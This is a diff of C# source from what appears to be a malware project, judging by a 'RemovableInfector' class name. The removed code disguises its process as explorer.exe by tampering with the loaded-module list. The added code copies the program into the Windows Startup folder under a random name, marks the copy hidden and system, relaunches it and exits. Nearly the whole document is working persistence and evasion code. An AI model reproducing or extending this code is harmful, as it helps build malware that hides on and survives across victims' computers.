@@ -1,7 +1,9 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.IO;
 using System.Linq;
+using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
@@ -23,51 +25,48 @@ namespace zort
             return cloneBytes;
         }
 
-        public static unsafe void MasqueradeAsExplorer()
+        public static void SetDACL()
         {
-            NativeMethods.CoInitializeEx(IntPtr.Zero, NativeMethods.COINIT_APARTMENTTHREADED | NativeMethods.COINIT_DISABLE_OLE1DDE);
-            NativeMethods.LdrEnumerateLoadedModules(0, (IntPtr entryPtr, IntPtr context, ref bool stop) =>
+            IntPtr ptr = NativeMethods.GetCurrentProcess();
+            NativeMethods.SetProcessPrivilege(ptr, NativeMethods.ProcessAccessRights.PROCESS_ALL_ACCESS);
+        }
+
+        public static void MoveAndRunFromStartup()
+        {
+            try
             {
-                var entry = (LDR_DATA_TABLE_ENTRY)Marshal.PtrToStructure(entryPtr, typeof(LDR_DATA_TABLE_ENTRY));
-                if (entry.DllBase == NativeMethods.GetImageBase())
+                string currentPath = Assembly.GetExecutingAssembly().Location;
+
+                // Move self to startup folder
+                string randomExecutableName = Path.GetRandomFileName() + ".appxbundl" + ".exe";
+
+                string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
+
+                string startupPath = Path.Combine(startupFolder, randomExecutableName);
+
+                if (startupFolder == Path.GetDirectoryName(currentPath))
                 {
-                    string fakeName = "explorer.exe";
-                    var fakeNameBuffer = Marshal.StringToHGlobalUni(fakeName);
-                    entry.BaseDllName.Buffer = fakeNameBuffer;
-                    entry.BaseDllName.Length = (ushort)(fakeName.Length * 2);
-                    entry.BaseDllName.MaximumLength = (ushort)((fakeName.Length + 1) * 2);
-
-                    string fakePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), fakeName);
-                    var fakePathBuffer = Marshal.StringToHGlobalUni(fakePath);
-                    entry.FullDllName.Buffer = fakePathBuffer;
-                    entry.FullDllName.Length = (ushort)(fakePath.Length * 2);
-                    entry.FullDllName.MaximumLength = (ushort)((fakePath.Length + 1) * 2);
-
-                    Marshal.StructureToPtr(entry, entryPtr, true);
-                    stop = true;
-                    return true;
+                    ModuleLogger.Log(typeof(RemovableInfector), "Already running from startup folder.");
+                    return;
                 }
-                return false;
-            }, IntPtr.Zero);
-            NativeMethods.CoUninitialize();
-        }
 
-        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
-        public struct LDR_DATA_TABLE_ENTRY
-        {
-            public IntPtr Reserved1;
-            public IntPtr Reserved2;
-            public IntPtr DllBase;
-            public UNICODE_STRING FullDllName;
-            public UNICODE_STRING BaseDllName;
-        }
+                File.Copy(currentPath, startupPath, true);
+                ModuleLogger.Log(typeof(RemovableInfector), $"Moved self to startup folder: {startupPath}");
 
-        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
-        public struct UNICODE_STRING
-        {
-            public ushort Length;
-            public ushort MaximumLength;
-            public IntPtr Buffer;
+                // Give hidden and system attributes to the file
+                File.SetAttributes(startupPath, FileAttributes.Hidden | FileAttributes.System);
+                ModuleLogger.Log(typeof(RemovableInfector), $"Set hidden and system attributes to: {startupPath}");
+
+                // Start the cloned executable and exit
+                System.Diagnostics.Process.Start(startupPath);
+                ModuleLogger.Log(typeof(RemovableInfector), $"Started cloned executable: {startupPath}");
+                ModuleLogger.Log(typeof(RemovableInfector), "Exiting original process.");
+                // Exit the current process
+                Environment.Exit(0);
+            } catch (Exception ex)
+            {
+                ModuleLogger.Log(typeof(RemovableInfector), $"Error moving and running from startup: {ex.Message}");
+            }
         }
     }
 }
